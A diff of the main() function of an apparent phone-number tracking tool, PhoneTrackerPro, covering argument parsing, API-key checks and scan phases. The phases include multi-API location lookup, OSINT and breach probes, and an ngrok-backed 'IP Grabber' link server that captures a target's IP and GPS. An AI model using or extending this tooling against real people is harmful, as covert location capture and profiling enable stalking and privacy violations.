     case_group.add_argument("--officer", type=str, default=None, metavar="NAME", help="Investigating officer name")
@@ -2521,18 +2784,23 @@ def main():
     case_group.add_argument("--classification", type=str, default="RESTRICTED",
                             choices=["UNCLASSIFIED", "RESTRICTED", "CONFIDENTIAL", "SECRET"],
                             metavar="LEVEL", help="Classification level: UNCLASSIFIED, RESTRICTED, CONFIDENTIAL, SECRET (default: RESTRICTED)")
+
     grab_group = parser.add_argument_group("IP Grabber")
     grab_group.add_argument("--grab", action="store_true", help="Launch IP Grabber link server to capture target's IP/GPS")
     grab_group.add_argument("--grab-port", type=int, default=8888, metavar="PORT", help="Port for IP Grabber server (default: 8888)")
+
     report_group = parser.add_argument_group("Report Options")
     report_group.add_argument("--no-map", action="store_true", help="Skip Folium map generation")
     report_group.add_argument("--no-report", action="store_true", help="Skip HTML report generation")
     report_group.add_argument("--json-only", action="store_true", help="Only generate JSON report (no HTML/map)")
     report_group.add_argument("--output-dir", type=str, default="output", metavar="DIR", help="Output directory for reports (default: output/)")
+
     parser.add_argument("--version", action="version", version=f"PhoneTrackerPro v{VERSION}")
     args = parser.parse_args()
+
     # Ensure output directory exists
     os.makedirs(args.output_dir, exist_ok=True)
+
     # Show scan config
     scan_mode = "QUICK" if args.quick else "IP GRABBER" if args.grab else "FULL"
     skips = []
@@ -2540,17 +2808,20 @@ def main():
     if args.skip_osint: skips.append("OSINT")
     if args.skip_deep: skips.append("Deep OSINT")
     skip_str = ", ".join(skips) if skips else "None"
+
     # Check API keys
     api_status = []
-    api_status.append(("TRESTLE", "[OK]" if os.getenv("TRESTLE_API_KEY") else "[X]"))
-    api_status.append(("NUMVERIFY", "[OK]" if os.getenv("NUMVERIFY_API_KEY") else "[X]"))
-    api_status.append(("ABSTRACT", "[OK]" if os.getenv("ABSTRACT_API_KEY") else "[X]"))
-    api_status.append(("IPINFO", "[OK]" if os.getenv("IPINFO_TOKEN") else "[X]"))
-    api_status.append(("OPENCAGE", "[OK]" if os.getenv("OPENCAGE_API_KEY") else "[X]"))
+    api_status.append(("TRESTLE", "[OK]" if os.getenv("TRESTLE_API_KEY") else "[ERROR]"))
+    api_status.append(("NUMVERIFY", "[OK]" if os.getenv("NUMVERIFY_API_KEY") else "[ERROR]"))
+    api_status.append(("ABSTRACT", "[OK]" if os.getenv("ABSTRACT_API_KEY") else "[ERROR]"))
+    api_status.append(("IPINFO", "[OK]" if os.getenv("IPINFO_TOKEN") else "[ERROR]"))
+    api_status.append(("OPENCAGE", "[OK]" if os.getenv("OPENCAGE_API_KEY") else "[ERROR]"))
     api_str = "  ".join([f"{'[green]' if s == '[OK]' else '[red]'}{n}: {s}{'[/green]' if s == '[OK]' else '[/red]'}" for n, s in api_status])
+
     # Classification display
     cls_styles = {"UNCLASSIFIED": "green", "RESTRICTED": "yellow", "CONFIDENTIAL": "red", "SECRET": "bold red"}
     cls_style = cls_styles.get(args.classification, "yellow")
+
     console.print(Panel(
         f"[bold white]  Mode:[/bold white] {scan_mode}  |  [bold white]Skipping:[/bold white] {skip_str}\n"
         f"  API Keys: {api_str}\n"
@@ -2558,9 +2829,14 @@ def main():
         f"[bold white]Case:[/bold white] {args.case_id or 'Auto-generated'}  |  "
         f"[bold white]Officer:[/bold white] {args.officer or 'Not specified'}\n"
         f"  [bold white]Output:[/bold white] {args.output_dir}/",
-        title=f"Scan Configuration",
-        border_style="dim", box=box.ASCII))
+        title=f"[bold cyan]ÔÜÖ Scan Configuration[/bold cyan]",
+        border_style="dim"))
+
+
     tracker = PhoneTrackerPro(args.phone)
+    # START NGROK EARLY (Background)
+    tracker.pre_init_ngrok()
+
     # Apply case management overrides
     if args.case_id:
         tracker.case_id = args.case_id
@@ -2570,55 +2846,71 @@ def main():
     if args.unit:
         tracker.unit = args.unit
     tracker.classification = args.classification
+
     # Phase 1: Parse & Validate
     console.print()
     if not tracker.parse_number():
-        console.print("[red]  Ô£ù Invalid phone number. Exiting.[/red]")
+        console.print("[red]  [ERROR] Invalid phone number. Exiting.[/red]")
         sys.exit(1)
+
     # Phase 2: Basic Info
     tracker.get_basic_info()
     tracker.display_basic_info()
+
     # Phase 3: Telecom Circle (India only)
     tracker.detect_telecom_circle()
+
     if args.quick:
         console.print(Panel("[yellow]  Quick mode - skipping advanced phases.[/yellow]", border_style="yellow"))
         tracker.generate_reports(no_map=args.no_map, no_report=args.no_report, json_only=args.json_only)
         _print_summary(tracker)
         return
+
     # Phase 4: Live Location (multi-API cross-reference)
     if not args.skip_live:
         tracker.detect_live_location()
         tracker._log_evidence("live_location_complete", f"Consensus: {tracker.consensus_city}, Votes: {len(tracker.all_votes)}")
+
     # Phase 5: Geolocation (OpenCage / Nominatim)
     geo_city = tracker.live_location.get("city") or tracker.basic_info.get("location")
     if geo_city:
         tracker.advanced_geolocate(geo_city)
         tracker.display_geolocation()
         tracker._log_evidence("geolocation_complete", f"Resolved: {tracker.geo_results.get('formatted_address', 'N/A')}")
+
     # Phase 6: OSINT Platform Probes
     if not args.skip_osint:
         tracker.run_osint()
         osint_hits = sum(1 for v in tracker.osint_results.values()
                          if isinstance(v, dict) and (v.get("found") or v.get("registered")))
         tracker._log_evidence("osint_complete", f"Platforms found: {osint_hits}, Owner: {tracker.owner_name or 'Unknown'}")
+
     # Phase 7: Deep OSINT
     if not args.skip_deep:
         tracker.run_deep_osint()
         tracker._log_evidence("deep_osint_complete", f"Breach sources: {tracker.deep_osint.get('breach_check', {}).get('sources_found', 0)}")
+
     # Phase 8: Reports
     tracker.generate_reports(no_map=args.no_map, no_report=args.no_report, json_only=args.json_only)
+
     # Final Summary
     _print_summary(tracker)
+
     console.print()
     console.print(Panel(
         f"[bold green]  [OK] Intelligence collection complete![/bold green]\n"
         f"  [dim]Case: {tracker.case_id}  |  Classification: {tracker.classification}[/dim]",
         border_style="green"))
     console.print()
+
     # Phase 9: IP Grabber Mode (runs AFTER full scan so all intel is gathered)
     if args.grab:
         console.print(Panel("[bold yellow]  Launching IP Grabber server... (full scan data saved above)[/bold yellow]", border_style="yellow"))
         tracker.generate_ip_grabber(port=args.grab_port)
         return  # Server runs until Ctrl+C
+
+
 if __name__ == "__main__":
     main()
+
+
